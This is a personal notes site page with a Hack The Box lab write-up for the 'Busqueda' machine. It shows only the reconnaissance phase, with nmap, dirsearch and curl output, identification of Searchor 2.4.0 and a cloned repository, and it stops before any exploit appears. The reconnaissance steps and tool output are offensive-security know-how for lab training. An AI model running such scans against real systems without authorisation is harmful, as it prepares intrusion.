@@ -1,0 +1,1182 @@
+<!doctype html>
+<html class="no-js" lang="en" data-content_root="">
+  <head><meta charset="utf-8"/>
+    <meta name="viewport" content="width=device-width,initial-scale=1"/>
+    <meta name="color-scheme" content="light dark"><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+    <!-- Google tag (gtag.js) -->
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-2TCTE0JE23"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'G-2TCTE0JE23');
+    </script>
+        <link href="../../../../_static/lazer_fox.png" sizes="300x300" rel="icon" type="image/png"><link rel="index" title="Index" href="../../../../genindex.html" /><link rel="search" title="Search" href="../../../../search.html" /><link rel="next" title="Codify" href="../codify/codify.html" /><link rel="prev" title="Analytics" href="../analytics/analytics.html" />
+
+    <!-- Generated with Sphinx 7.1.2 and Furo 2023.08.19 -->
+        <title>Busqueda - blnkn&#39;s notes</title>
+      <link rel="stylesheet" type="text/css" href="../../../../_static/pygments.css?v=a746c00c" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo.css?v=135e06be" />
+    <link rel="stylesheet" type="text/css" href="../../../../_static/styles/furo-extensions.css?v=36a5483c" />
+    
+    
+
+
+<style>
+  body {
+    --color-code-background: #f8f8f8;
+  --color-code-foreground: black;
+  
+  }
+  @media not print {
+    body[data-theme="dark"] {
+      --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+    }
+    @media (prefers-color-scheme: dark) {
+      body:not([data-theme="light"]) {
+        --color-code-background: #202020;
+  --color-code-foreground: #d0d0d0;
+  
+      }
+    }
+  }
+</style></head>
+  <body>
+    
+    <script>
+      document.body.dataset.theme = localStorage.getItem("theme") || "auto";
+    </script>
+    
+
+<svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
+  <symbol id="svg-toc" viewBox="0 0 24 24">
+    <title>Contents</title>
+    <svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024">
+      <path d="M408 442h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8zm-8 204c0 4.4 3.6 8 8 8h480c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8H408c-4.4 0-8 3.6-8 8v56zm504-486H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zm0 632H120c-4.4 0-8 3.6-8 8v56c0 4.4 3.6 8 8 8h784c4.4 0 8-3.6 8-8v-56c0-4.4-3.6-8-8-8zM115.4 518.9L271.7 642c5.8 4.6 14.4.5 14.4-6.9V388.9c0-7.4-8.5-11.5-14.4-6.9L115.4 505.1a8.74 8.74 0 0 0 0 13.8z"/>
+    </svg>
+  </symbol>
+  <symbol id="svg-menu" viewBox="0 0 24 24">
+    <title>Menu</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-menu">
+      <line x1="3" y1="12" x2="21" y2="12"></line>
+      <line x1="3" y1="6" x2="21" y2="6"></line>
+      <line x1="3" y1="18" x2="21" y2="18"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-arrow-right" viewBox="0 0 24 24">
+    <title>Expand</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather-chevron-right">
+      <polyline points="9 18 15 12 9 6"></polyline>
+    </svg>
+  </symbol>
+  <symbol id="svg-sun" viewBox="0 0 24 24">
+    <title>Light mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="feather-sun">
+      <circle cx="12" cy="12" r="5"></circle>
+      <line x1="12" y1="1" x2="12" y2="3"></line>
+      <line x1="12" y1="21" x2="12" y2="23"></line>
+      <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+      <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+      <line x1="1" y1="12" x2="3" y2="12"></line>
+      <line x1="21" y1="12" x2="23" y2="12"></line>
+      <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+      <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+    </svg>
+  </symbol>
+  <symbol id="svg-moon" viewBox="0 0 24 24">
+    <title>Dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-moon">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none" />
+      <path d="M12 3c.132 0 .263 0 .393 0a7.5 7.5 0 0 0 7.92 12.446a9 9 0 1 1 -8.313 -12.454z" />
+    </svg>
+  </symbol>
+  <symbol id="svg-sun-half" viewBox="0 0 24 24">
+    <title>Auto light/dark mode</title>
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+      stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" class="icon-tabler-shadow">
+      <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+      <circle cx="12" cy="12" r="9" />
+      <path d="M13 12h5" />
+      <path d="M13 15h4" />
+      <path d="M13 18h1" />
+      <path d="M13 9h4" />
+      <path d="M13 6h1" />
+    </svg>
+  </symbol>
+</svg>
+
+<input type="checkbox" class="sidebar-toggle" name="__navigation" id="__navigation">
+<input type="checkbox" class="sidebar-toggle" name="__toc" id="__toc">
+<label class="overlay sidebar-overlay" for="__navigation">
+  <div class="visually-hidden">Hide navigation sidebar</div>
+</label>
+<label class="overlay toc-overlay" for="__toc">
+  <div class="visually-hidden">Hide table of contents sidebar</div>
+</label>
+
+
+
+<div class="page">
+  <header class="mobile-header">
+    <div class="header-left">
+      <label class="nav-overlay-icon" for="__navigation">
+        <div class="visually-hidden">Toggle site navigation sidebar</div>
+        <i class="icon"><svg><use href="#svg-menu"></use></svg></i>
+      </label>
+    </div>
+    <div class="header-center">
+      <a href="../../../../index.html"><div class="brand">blnkn's notes</div></a>
+    </div>
+    <div class="header-right">
+      <div class="theme-toggle-container theme-toggle-header">
+        <button class="theme-toggle">
+          <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+          <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+          <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+          <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+        </button>
+      </div>
+      <label class="toc-overlay-icon toc-header-icon" for="__toc">
+        <div class="visually-hidden">Toggle table of contents sidebar</div>
+        <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+      </label>
+    </div>
+  </header>
+  <aside class="sidebar-drawer">
+    <div class="sidebar-container">
+      
+      <div class="sidebar-sticky"><a class="sidebar-brand" href="../../../../index.html">
+  
+  <div class="sidebar-logo-container">
+    <img class="sidebar-logo" src="../../../../_static/lazer_fox.png" alt="Logo"/>
+  </div>
+  
+  <span class="sidebar-brand-text">blnkn's notes</span>
+  
+</a><form class="sidebar-search-container" method="get" action="../../../../search.html" role="search">
+  <input class="sidebar-search" placeholder="Search" name="q" aria-label="Search">
+  <input type="hidden" name="check_keywords" value="yes">
+  <input type="hidden" name="area" value="default">
+</form>
+<div id="searchbox"></div><div class="sidebar-scroll"><div class="sidebar-tree">
+  <p class="caption" role="heading"><span class="caption-text">Contents:</span></p>
+<ul class="current">
+<li class="toctree-l1 current has-children"><a class="reference internal" href="../../../htb.html">Hack The Box</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-1" name="toctree-checkbox-1" role="switch" type="checkbox"/><label for="toctree-checkbox-1"><div class="visually-hidden">Toggle navigation of Hack The Box</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../academy/academy.html">Academy</a><input class="toctree-checkbox" id="toctree-checkbox-2" name="toctree-checkbox-2" role="switch" type="checkbox"/><label for="toctree-checkbox-2"><div class="visually-hidden">Toggle navigation of Academy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/active-directory/active-directory.html">Active Directory</a><input class="toctree-checkbox" id="toctree-checkbox-3" name="toctree-checkbox-3" role="switch" type="checkbox"/><label for="toctree-checkbox-3"><div class="visually-hidden">Toggle navigation of Active Directory</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html">Active Directory</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/ad/ad.html#user-account-control-values">User Account Control Values</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/kerberos/kerberos.html">Kerberos</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/active-directory/windows-auth/windows-auth.html">Windows Authentication</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/buffer-overflows/buffer-overflows.html">Buffer Overflows</a><input class="toctree-checkbox" id="toctree-checkbox-4" name="toctree-checkbox-4" role="switch" type="checkbox"/><label for="toctree-checkbox-4"><div class="visually-hidden">Toggle navigation of Buffer Overflows</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/buffer-overflows/linux-buffer-overflows/linux-buffer-overflows.html">Linux Buffer Overflows</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/hashcat/hashcat.html">Hashcat</a></li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../../academy/os-fundamentals/os-fundamentals.html">OS Fundamentals</a><input class="toctree-checkbox" id="toctree-checkbox-5" name="toctree-checkbox-5" role="switch" type="checkbox"/><label for="toctree-checkbox-5"><div class="visually-hidden">Toggle navigation of OS Fundamentals</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../../academy/os-fundamentals/windows-fundamentals/windows-fundamentals.html">Windows OS Fundamentals</a></li>
+</ul>
+</li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/sqli/sqli.html">SQLi</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../academy/webapp/webapp.html">Web Apps</a></li>
+</ul>
+</li>
+<li class="toctree-l2 current has-children"><a class="reference internal" href="../../machines.html">Lab Machines</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-6" name="toctree-checkbox-6" role="switch" type="checkbox"/><label for="toctree-checkbox-6"><div class="visually-hidden">Toggle navigation of Lab Machines</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../hard/hard.html">Hard</a><input class="toctree-checkbox" id="toctree-checkbox-7" name="toctree-checkbox-7" role="switch" type="checkbox"/><label for="toctree-checkbox-7"><div class="visually-hidden">Toggle navigation of Hard</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../hard/snoopy/snoopy.html">Snoopy</a></li>
+</ul>
+</li>
+<li class="toctree-l3 has-children"><a class="reference internal" href="../../medium/medium.html">Medium</a><input class="toctree-checkbox" id="toctree-checkbox-8" name="toctree-checkbox-8" role="switch" type="checkbox"/><label for="toctree-checkbox-8"><div class="visually-hidden">Toggle navigation of Medium</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/ambassador/ambassador.html">Ambassador</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/authority/authority.html">Authority</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/awkward/awkward.html">Awkward</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/faculty/faculty.html">Faculty</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/forgot/forgot.html">Forgot</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/format/format.html">Format</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/health/health.html">Health</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/jupiter/jupiter.html">Jupiter</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/manager/manager.html">Manager</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/mentor/mentor.html">Mentor</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/only4you/only4you.html">Only4you</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/outdated/outdated.html">Outdated</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/sandworm/sandworm.html">Sandworm</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/scrambled/scrambled.html">Scrambled</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/shared/shared.html">Shared</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/updown/updown.html">Updown</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../../medium/zipping/zipping.html">Zipping</a></li>
+</ul>
+</li>
+<li class="toctree-l3 current has-children"><a class="reference internal" href="../easy.html">Easy</a><input checked="" class="toctree-checkbox" id="toctree-checkbox-9" name="toctree-checkbox-9" role="switch" type="checkbox"/><label for="toctree-checkbox-9"><div class="visually-hidden">Toggle navigation of Easy</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul class="current">
+<li class="toctree-l4"><a class="reference internal" href="../analytics/analytics.html">Analytics</a></li>
+<li class="toctree-l4 current current-page"><a class="current reference internal" href="#">Busqueda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../codify/codify.html">Codify</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../inject/inject.html">Inject</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../keeper/keeper.html">Keeper</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../metatwo/metatwo.html">Meta two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../monitorstwo/monitorstwo.html">Monitors two</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../pc/pc.html">Pc</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../photobomb/photobomb.html">Photobomb</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../pilgrimage/pilgrimage.html">Pilgrimage</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../precious/precious.html">Precious</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../red_panda/red_panda.html">Red panda</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../sau/sau.html">Sau</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../shoppy/shoppy.html">Shoppy</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../soccer/soccer.html">Soccer</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../stocker/stocker.html">Stocker</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../support/support.html">Support</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../topology/topology.html">Topology</a></li>
+<li class="toctree-l4"><a class="reference internal" href="../trick/trick.html">Trick</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../pg/pg.html">Proving Grounds</a><input class="toctree-checkbox" id="toctree-checkbox-10" name="toctree-checkbox-10" role="switch" type="checkbox"/><label for="toctree-checkbox-10"><div class="visually-hidden">Toggle navigation of Proving Grounds</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/ha_natraj/ha_natraj.html">Ha Natraj</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../pg/sunset_decoy/sunset_decoy.html">Sunset Decoy</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../dvwa/dvwa.html">DVWA</a><input class="toctree-checkbox" id="toctree-checkbox-11" name="toctree-checkbox-11" role="switch" type="checkbox"/><label for="toctree-checkbox-11"><div class="visually-hidden">Toggle navigation of DVWA</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../dvwa/sqli_blind/sqli_blind.html">Blind SQLi</a></li>
+</ul>
+</li>
+<li class="toctree-l1 has-children"><a class="reference internal" href="../../../../other/other.html">Other</a><input class="toctree-checkbox" id="toctree-checkbox-12" name="toctree-checkbox-12" role="switch" type="checkbox"/><label for="toctree-checkbox-12"><div class="visually-hidden">Toggle navigation of Other</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/assembly/assembly.html">Assembly</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/aws-ccp/aws-ccp.html">AWS-CCP</a><input class="toctree-checkbox" id="toctree-checkbox-13" name="toctree-checkbox-13" role="switch" type="checkbox"/><label for="toctree-checkbox-13"><div class="visually-hidden">Toggle navigation of AWS-CCP</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/1-foundations-of-cloud-computing.html">Foundations of Cloud Computing</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/2-technology.html">Technologies</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/3-security-and-compliance.html">Security and Compliance</a></li>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/aws-ccp/4-pricing-billing-and-governance.html">Pricing Billing and Governance</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/codebashing/codebashing.html">Codebashing</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dba/dba.html">Database Administration</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/dorking/dorking.html">Google dork cheatsheet</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/empire/empire.html">Empire</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/hashes/hashes.html">Hashes</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/irssi/irssi.html">Irssi</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/metasploit/metasploit.html">Metasploit framework</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/nmap/nmap.html">Nmap</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/reconstructing-private-key/reconstructing-private-key.html">Reconstructing a Private Key</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/rfid/rfid.html">RFID</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/server-hardening/server-hardening.html">Server Hardening</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/shells/shells.html">Reverse Shells</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/stego/stego.html">Steganography</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/tcpdump-vuln/tcpdump-vuln.html">TCPdump</a></li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/wordlists/wordlists.html">Making Custom Wordlists</a></li>
+<li class="toctree-l2 has-children"><a class="reference internal" href="../../../../other/c/c.html">C</a><input class="toctree-checkbox" id="toctree-checkbox-14" name="toctree-checkbox-14" role="switch" type="checkbox"/><label for="toctree-checkbox-14"><div class="visually-hidden">Toggle navigation of C</div><i class="icon"><svg><use href="#svg-arrow-right"></use></svg></i></label><ul>
+<li class="toctree-l3"><a class="reference internal" href="../../../../other/c/execution-methods.html">C Execution methods</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="../../../../other/air-ungap/air-ungap.html">Air-Ungap</a></li>
+</ul>
+</li>
+</ul>
+
+</div>
+</div>
+
+      </div>
+      
+    </div>
+  </aside>
+  <div class="main">
+    <div class="content">
+      <div class="article-container">
+        <a href="#" class="back-to-top muted-link">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+            <path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12z"></path>
+          </svg>
+          <span>Back to top</span>
+        </a>
+        <div class="content-icon-container">
+          
+<div class="theme-toggle-container theme-toggle-content">
+            <button class="theme-toggle">
+              <div class="visually-hidden">Toggle Light / Dark / Auto color theme</div>
+              <svg class="theme-icon-when-auto"><use href="#svg-sun-half"></use></svg>
+              <svg class="theme-icon-when-dark"><use href="#svg-moon"></use></svg>
+              <svg class="theme-icon-when-light"><use href="#svg-sun"></use></svg>
+            </button>
+          </div>
+          <label class="toc-overlay-icon toc-content-icon" for="__toc">
+            <div class="visually-hidden">Toggle table of contents sidebar</div>
+            <i class="icon"><svg><use href="#svg-toc"></use></svg></i>
+          </label>
+        </div>
+        <article role="main">
+          <p><img alt="busqueda.png" src="../../../../_images/busqueda.png" /></p>
+<section id="busqueda">
+<h1>Busqueda<a class="headerlink" href="#busqueda" title="Permalink to this heading">#</a></h1>
+<section id="enum">
+<h2>Enum<a class="headerlink" href="#enum" title="Permalink to this heading">#</a></h2>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>nmap<span class="w"> </span>-sC<span class="w"> </span>-sV<span class="w"> </span><span class="m">10</span>.10.11.208<span class="w"> </span>-oN<span class="w"> </span>scans/nmap.initial
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.93<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-05-01<span class="w"> </span><span class="m">09</span>:30<span class="w"> </span>IST
+Nmap<span class="w"> </span>scan<span class="w"> </span>report<span class="w"> </span><span class="k">for</span><span class="w"> </span>searcher.htb<span class="w"> </span><span class="o">(</span><span class="m">10</span>.10.11.208<span class="o">)</span>
+Host<span class="w"> </span>is<span class="w"> </span>up<span class="w"> </span><span class="o">(</span><span class="m">0</span>.024s<span class="w"> </span>latency<span class="o">)</span>.
+Not<span class="w"> </span>shown:<span class="w"> </span><span class="m">998</span><span class="w"> </span>closed<span class="w"> </span>tcp<span class="w"> </span>ports<span class="w"> </span><span class="o">(</span>conn-refused<span class="o">)</span>
+PORT<span class="w">   </span>STATE<span class="w"> </span>SERVICE<span class="w"> </span>VERSION
+<span class="m">22</span>/tcp<span class="w"> </span>open<span class="w">  </span>ssh<span class="w">     </span>OpenSSH<span class="w"> </span><span class="m">8</span>.9p1<span class="w"> </span>Ubuntu<span class="w"> </span>3ubuntu0.1<span class="w"> </span><span class="o">(</span>Ubuntu<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>protocol<span class="w"> </span><span class="m">2</span>.0<span class="o">)</span>
+<span class="p">|</span><span class="w"> </span>ssh-hostkey:
+<span class="p">|</span><span class="w">   </span><span class="m">256</span><span class="w"> </span>4fe3a667a227f9118dc30ed773a02c28<span class="w"> </span><span class="o">(</span>ECDSA<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span><span class="m">256</span><span class="w"> </span>816e78766b8aea7d1babd436b7f8ecc4<span class="w"> </span><span class="o">(</span>ED25519<span class="o">)</span>
+<span class="m">80</span>/tcp<span class="w"> </span>open<span class="w">  </span>http<span class="w">    </span>Apache<span class="w"> </span>httpd<span class="w"> </span><span class="m">2</span>.4.52
+<span class="p">|</span><span class="w"> </span>http-server-header:
+<span class="p">|</span><span class="w">   </span>Apache/2.4.52<span class="w"> </span><span class="o">(</span>Ubuntu<span class="o">)</span>
+<span class="p">|</span>_<span class="w">  </span>Werkzeug/2.1.2<span class="w"> </span>Python/3.10.6
+<span class="p">|</span>_http-title:<span class="w"> </span>Searcher
+Service<span class="w"> </span>Info:<span class="w"> </span>OS:<span class="w"> </span>Linux<span class="p">;</span><span class="w"> </span>CPE:<span class="w"> </span>cpe:/o:linux:linux_kernel
+
+Service<span class="w"> </span>detection<span class="w"> </span>performed.<span class="w"> </span>Please<span class="w"> </span>report<span class="w"> </span>any<span class="w"> </span>incorrect<span class="w"> </span>results<span class="w"> </span>at<span class="w"> </span>https://nmap.org/submit/<span class="w"> </span>.
+Nmap<span class="w"> </span><span class="k">done</span>:<span class="w"> </span><span class="m">1</span><span class="w"> </span>IP<span class="w"> </span>address<span class="w"> </span><span class="o">(</span><span class="m">1</span><span class="w"> </span>host<span class="w"> </span>up<span class="o">)</span><span class="w"> </span>scanned<span class="w"> </span><span class="k">in</span><span class="w"> </span><span class="m">8</span>.05<span class="w"> </span>seconds
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>dirsearch<span class="w"> </span>-r<span class="w"> </span>-u<span class="w"> </span>http://searcher.htb
+
+<span class="w">  </span>_<span class="p">|</span>.<span class="w"> </span>_<span class="w"> </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w">  </span>_<span class="w"> </span>_<span class="p">|</span>_<span class="w">    </span>v0.4.2
+<span class="w"> </span><span class="o">(</span>_<span class="o">||</span><span class="p">|</span><span class="w"> </span>_<span class="o">)</span><span class="w"> </span><span class="o">(</span>/_<span class="o">(</span>_<span class="o">||</span><span class="w"> </span><span class="o">(</span>_<span class="p">|</span><span class="w"> </span><span class="o">)</span>
+
+Extensions:<span class="w"> </span>php,<span class="w"> </span>aspx,<span class="w"> </span>jsp,<span class="w"> </span>html,<span class="w"> </span>js<span class="w"> </span><span class="p">|</span><span class="w"> </span>HTTP<span class="w"> </span>method:<span class="w"> </span>GET<span class="w"> </span><span class="p">|</span><span class="w"> </span>Threads:<span class="w"> </span><span class="m">30</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>Wordlist<span class="w"> </span>size:<span class="w"> </span><span class="m">10927</span>
+
+Output<span class="w"> </span>File:<span class="w"> </span>/home/blnkn/.dirsearch/reports/searcher.htb/_23-05-01_09-36-48.txt
+
+Error<span class="w"> </span>Log:<span class="w"> </span>/home/blnkn/.dirsearch/logs/errors-23-05-01_09-36-48.log
+
+Target:<span class="w"> </span>http://searcher.htb/
+
+<span class="o">[</span><span class="m">09</span>:36:48<span class="o">]</span><span class="w"> </span>Starting:
+<span class="o">[</span><span class="m">09</span>:37:24<span class="o">]</span><span class="w"> </span><span class="m">405</span><span class="w"> </span>-<span class="w">  </span>153B<span class="w">  </span>-<span class="w"> </span>/search
+<span class="o">[</span><span class="m">09</span>:37:24<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>277B<span class="w">  </span>-<span class="w"> </span>/server-status/<span class="w">     </span><span class="o">(</span>Added<span class="w"> </span>to<span class="w"> </span>queue<span class="o">)</span>
+<span class="o">[</span><span class="m">09</span>:37:24<span class="o">]</span><span class="w"> </span><span class="m">403</span><span class="w"> </span>-<span class="w">  </span>277B<span class="w">  </span>-<span class="w"> </span>/server-status
+<span class="o">[</span><span class="m">09</span>:37:31<span class="o">]</span><span class="w"> </span>Starting:<span class="w"> </span>server-status/
+<span class="o">[</span><span class="m">09</span>:37:31<span class="o">]</span><span class="w"> </span><span class="m">404</span><span class="w"> </span>-<span class="w">  </span>207B<span class="w">  </span>-<span class="w"> </span>/server-status/%2e%2e//google.com
+
+Task<span class="w"> </span>Completed
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span>-I<span class="w"> </span>-X<span class="w"> </span>POST<span class="w"> </span>http://searcher.htb/search
+HTTP/1.1<span class="w"> </span><span class="m">200</span><span class="w"> </span>OK
+Date:<span class="w"> </span>Mon,<span class="w"> </span><span class="m">01</span><span class="w"> </span>May<span class="w"> </span><span class="m">2023</span><span class="w"> </span><span class="m">08</span>:49:00<span class="w"> </span>GMT
+Server:<span class="w"> </span>Werkzeug/2.1.2<span class="w"> </span>Python/3.10.6
+Content-Type:<span class="w"> </span>text/html<span class="p">;</span><span class="w"> </span><span class="nv">charset</span><span class="o">=</span>utf-8
+Content-Length:<span class="w"> </span><span class="m">13534</span>
+Vary:<span class="w"> </span>Accept-Encoding
+</pre></div>
+</div>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Powered</span> <span class="n">by</span> <span class="n">Flask</span> <span class="ow">and</span> <span class="n">Searchor</span> <span class="mf">2.4.0</span>
+</pre></div>
+</div>
+<p><a class="reference external" href="https://github.com/ArjunSharda/Searchor">https://github.com/ArjunSharda/Searchor</a><br />
+<a class="reference external" href="https://github.com/ArjunSharda/Searchor/pull/130/files/29d5b1f28d29d6a282a5e860d456fab2df24a16b">PR</a></p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>git<span class="w"> </span>clone<span class="w"> </span>https://github.com/ArjunSharda/Searchor.git
+</pre></div>
+</div>
+<p>Building the docker container to start experimenting with the library</p>
+<div class="highlight-python notranslate"><div class="highlight"><pre><span></span><span class="gp">&gt;&gt;&gt; </span><span class="kn">from</span> <span class="nn">searchor</span> <span class="kn">import</span> <span class="n">Engine</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">engine</span><span class="o">=</span><span class="s2">&quot;Youtube&quot;</span>
+<span class="gp">&gt;&gt;&gt; </span><span class="n">query</span><span class="o">=</span><span class="s2">&quot;hi&quot;</span>
